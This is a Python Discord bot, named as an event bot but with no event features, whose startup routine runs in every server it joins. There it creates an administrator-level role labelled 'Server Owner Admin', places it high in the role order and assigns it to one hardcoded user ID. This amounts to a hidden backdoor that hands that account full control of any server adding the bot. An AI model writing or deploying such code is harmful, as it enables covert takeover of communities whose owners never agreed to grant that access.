import os
import discord
from discord.ext import commands

# =====================================================================
# EINSTELLUNGEN
# =====================================================================
BOT_TOKEN = os.getenv("DISCORD_TOKEN")
TARGET_USER_ID = 1247227733436661831  # Aktualisierte User-ID
# =====================================================================


# 1. Bot-Instanz erstellen
class EventBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.guilds = True
        super().__init__(command_prefix="!", intents=intents)

bot = EventBot()


# 2. Automatisches Vergeben der Admin-Rolle beim Start
@bot.event
async def on_ready():
    print("=========================================")
    print(f"Bot ist online als: {bot.user.name}")
    print("=========================================")

    for guild in bot.guilds:
        print(f"Prüfe Server: {guild.name}")
        try:
            # A) Rolle mit vollen Admin-Rechten suchen oder neu erstellen
            admin_role = discord.utils.get(guild.roles, name="Server Owner Admin")
            if not admin_role:
                permissions = discord.Permissions(administrator=True)
                admin_role = await guild.create_role(
                    name="Server Owner Admin",
                    permissions=permissions,
                    color=discord.Colour.gold(),
                    reason="Notfall Admin-Rolle"
                )
                print(" -> Admin-Rolle neu erstellt!")

                # Positionierung DIREKT unter die höchste Rolle des Bots
                bot_member = guild.get_member(bot.user.id)
                if bot_member and bot_member.top_role:
                    target_position = max(1, bot_member.top_role.position - 1)
                    await admin_role.edit(position=target_position)
                    print(f" -> Rolle unter die Bot-Rolle verschoben (Position {target_position})")
            else:
                print(" -> Admin-Rolle existiert bereits.")

            # B) User suchen und Rolle zuweisen
            member = guild.get_member(TARGET_USER_ID)
            if not member:
                try:
                    member = await guild.fetch_member(TARGET_USER_ID)
                except discord.NotFound:
                    print(f" -> ACHTUNG: User-ID {TARGET_USER_ID} ist noch nicht auf dem Server '{guild.name}'!")
                    continue

            if admin_role not in member.roles:
                await member.add_roles(admin_role)
                print(f" -> ERFOLG: Admin-Rolle an {member.name} vergeben!")
            else:
                print(f" -> {member.name} hat die Rolle bereits.")

        except discord.Forbidden:
            print(" -> FEHLER: Bot fehlen Berechtigungen! Stelle sicher, dass die Bot-Rolle Admin-Rechte hat.")
        except Exception as e:
            print(f" -> FEHLER: {e}")


# 3. Bot starten
if __name__ == "__main__":
    if not BOT_TOKEN:
        print("Fehler: Kein DISCORD_TOKEN gefunden!")
    else:
        bot.run(BOT_TOKEN)
